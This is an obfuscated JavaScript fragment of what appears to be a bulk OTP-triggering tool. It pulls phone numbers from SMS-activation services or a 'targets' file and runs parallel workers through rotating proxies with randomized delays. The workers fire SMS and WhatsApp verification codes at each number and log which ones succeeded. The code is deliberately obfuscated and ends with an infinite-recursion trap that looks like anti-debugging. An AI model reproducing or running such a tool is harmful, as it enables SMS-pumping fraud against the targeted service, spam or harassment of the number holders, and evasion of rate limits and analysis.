            for (let v536 = 0; v536 < v493.totalCount; v536++) {
              try {
                const v537 = v493.ranges[Math.floor(Math.random() * v493.ranges.length)];
                let v538;
                if (v479) v538 = await nexaLimiter.enqueue(() => nexaFetchNumber(v479.apiKey, v537, v479.serverEndpoint));else {
                  v538 = await twoOoLimiter.enqueue(() => twoOoFetchNumber(v480.apiKey, v537, v480.getPath));
                }
                if (v538) {
                  v490++, v534 = 0;
                  if (v492.length > 0) {
                    const v539 = v492.shift();
                    v539(v538);
                  } else v488.push(v538);
                }
              } catch (v540) {
                {
                  v491++, v535 = v540.message, v534++;
                  if (v540.message.includes("Insufficient balance")) {
                    {
                      console.error(R("\n  [" + v533 + "] ✗ Insufficient balance — aborting.\n"));
                      break;
                    }
                  }
                  if (v540.message.includes("No numbers available")) {
                    continue;
                  }
                  if (v534 >= 5 && v490 === 0) {
                    {
                      console.error(R("\n  [" + v533 + "] ✗ Aborting — 5 consecutive fetch failures.")), console.error(R("  Last error: " + v535)), console.error(R("  Check your API key, range (e.g. 26134XXX), and internet.\n"));
                      break;
                    }
                  }
                }
              }
            }
            if (v490 === 0) {
              console.error(R("\n  [" + v533 + "] ✗ No numbers fetched. Last error: " + (v535 || "Unknown") + '\x0a'));
            }
            v489 = true;
            for (const v541 of v492) v541(null);
            v492 = [];
          }
        })();
      }
    } else {
      if (v481) {
        const v542 = v481;
        console.log(Y("\n  [📱 SMS Bower] Streaming " + v542.totalCount + " numbers...")), (async () => {
          let v543 = 0;
          for (let v544 = 0; v544 < v542.totalCount; v544++) {
            try {
              const {
                activationId: v545,
                phoneNumber: v546
              } = await smsBowerFetchNumber(v542.apiKey, v542.service, v542.country, v542.maxPrice);
              v490++, v543 = 0;
              if (v492.length > 0) v492.shift()(v546);else v488.push(v546);
            } catch (v547) {
              v543++;
              if (v543 >= 5 && v490 === 0) break;
              await new Promise(v548 => setTimeout(v548, 2000));
            }
          }
          v489 = true;
          for (const v549 of v492) v549(null);
          v492 = [];
        })();
      } else {
        if (v482) {
          const v550 = v482;
          console.log(Y("\n  [⚡ Zenex] Streaming " + v550.totalCount + " numbers (" + v550.ranges.length + " range(s))...")), (async () => {
            {
              let v551 = 0;
              for (let v552 = 0; v552 < v550.totalCount; v552++) {
                try {
                  const v553 = v550.ranges[Math.floor(Math.random() * v550.ranges.length)],
                    v554 = await zenexFetchNumber(v550.apiKey, v553);
                  v490++, v551 = 0;
                  if (v492.length > 0) v492.shift()(v554);else v488.push(v554);
                } catch (v555) {
                  {
                    v551++;
                    if (v551 >= 5 && v490 === 0) break;
                    await new Promise(v556 => setTimeout(v556, 2000));
                  }
                }
              }
              v489 = true;
              for (const v557 of v492) v557(null);
              v492 = [];
            }
          })();
        } else !fs.existsSync(v483) && (console.error(R("✗ Error: Numbers file not found: " + v483)), process.exit(1)), v487 = fs.readFileSync(v483, "utf8").split(/\r?\n/).map(v558 => v558.trim()).filter(v559 => v559 && v559.replace(/\D/g, '').length >= 7), v487.length === 0 && (console.error(R("✗ No valid phone numbers found in file")), process.exit(1));
      }
    }
    let v494 = [];
    v485 && fs.existsSync(v485) && (v494 = fs.readFileSync(v485, "utf8").split('\x0a').map(v560 => v560.trim()).filter(v561 => v561.length > 0));
    let v495 = v494.map(parseProxy).filter(Boolean);
    if (v493) {
      {
        const v562 = v479 ? "NexaOTP" : v480 ? v480.provider === "voltx" ? "Voltx ⚡" : "Stex 🔥" : v481 ? "📱 SMS Bower" : "⚡ Zenex";
        console.log(Y("  ✓ Mode: " + v562 + " Streaming (" + v493.totalCount + " numbers)"));
      }
    } else console.log(Y("✓ Loaded " + v487.length + " targets"));
    if (v495.length === 0) console.log(G("  No proxies configured (running direct)"));else console.log(G("  Proxies loaded: " + v495.length));
    console.log(C("✓ Threads: " + v484 + '\x0a')), fs.writeFileSync(SUCCESSFUL_FILE, ''), fs.writeFileSync(FAILED_FILE, ''), fs.writeFileSync(WHATSAPP_FILE, '');
    const v496 = v479 || v480 ? (v479 || v480).totalCount : v487.length,
      v497 = new Dashboard(v496),
      v498 = v479 || v480 ? async () => {
        {
          if (v488.length > 0) return v488.shift();
          if (v489) return null;
          return new Promise(v563 => {
            v492.push(v563);
          });
        }
      } : async () => {
        {
          if (v487.length === 0) return null;
          const v564 = Math.floor(Math.random() * v487.length);
          return v487.splice(v564, 1)[0];
        }
      },
      fn6 = () => {
        {
          if (v495.length === 0) return null;
          const v565 = v495[Math.floor(Math.random() * v495.length)],
            v566 = {
              ...v565
            };
          return rotateSessionId(v566);
        }
      };
    function fn7(v567) {
      try {
        {
          if (v479 || v480) return;
          const v568 = fs.readFileSync(v483, "utf8"),
            v569 = v568.split(/\r?\n/).filter(v570 => v570.trim() !== v567.trim()).join('\x0a');
          fs.writeFileSync(v483, v569);
        }
      } catch (v571) {}
    }
    const v499 = v479 || v480 ? Math.min(v484, (v479 || v480).totalCount) : Math.min(v484, v487.length),
      v500 = [],
      v501 = setInterval(() => v497.render(), 500);
    function fn8(v572) {
      return new Promise(v573 => setTimeout(v573, v572));
    }
    async function fn9(v574) {
      while (true) {
        const v575 = await v498();
        if (!v575) break;
        try {
          const v577 = fn6(),
            v578 = await triggerSms(v575, {
              'onStatus': v583 => v497.setStatus("Worker " + v574 + ':\x20' + v583),
              'proxy': v577,
              'timeout': 0x3a98,
              'languagePref': v486
            }),
            v579 = v578.langName || v486,
            v580 = v578.proxyCountryName || "Direct",
            v581 = v578.numberCountryName || "Unknown",
            v582 = '-\x20' + v579 + " - Proxy (" + v580 + ") Number (" + v581 + ')';
          if (v578.success) {
            {
              v497.successful++, v497.processed++, fn7(v575);
              if (v578.whatsapp) {
                {
                  fs.appendFileSync(WHATSAPP_FILE, v578.phone + "|OTP_SENT_WA\n"), v497.addLog("Triggered WA OTP for " + v578.phone, "whatsapp", v582);
                  const v584 = {};
                  v584.written = "whatsapp.txt", dbg(v578.phone, "✅ RESULT=WA_SUCCESS", null, v584);
                }
              } else {
                fs.appendFileSync(SUCCESSFUL_FILE, v578.phone + "|OTP_SENT\n"), v497.addLog("Triggered OTP for " + v578.phone, "success", v582), dbg(v578.phone, "✅ RESULT=SUCCESS", null, {
                  'written': "successful.txt",
                  'ageGated': v578.ageGated || false
                });
              }
            }
          } else v497.failed++, v497.processed++, fs.appendFileSync(FAILED_FILE, v578.phone + '|' + v578.message + '\x0a'), v497.addLog("Failed on " + v578.phone + ':\x20' + v578.message, "error", v582), dbg(v578.phone, "❌ RESULT=FAILED", v578.message, {
            'written': "failed.txt"
          });
        } catch (v585) {
          v497.failed++, v497.processed++, v497.addLog("Fatal error on " + v575 + ':\x20' + v585.message, "error", '');
        }
        const v576 = Math.floor(Math.random() * 3000) + 1500;
        await fn8(v576);
      }
    }
    for (let v586 = 0; v586 < v499; v586++) {
      v500.push(fn9(v586));
    }
    await Promise.all(v500), clearInterval(v501), typeof globalPingInterval !== "undefined" && clearInterval(globalPingInterval), v497.render(), v497.stop();
  }
  start();
}
function fn2(v587) {
  function fn10(v588) {
    {
      fn10(++v588);
    }
  }
  try {
    if (v587) {
      return fn10;
    } else fn10(0);
  } catch (v589) {}
}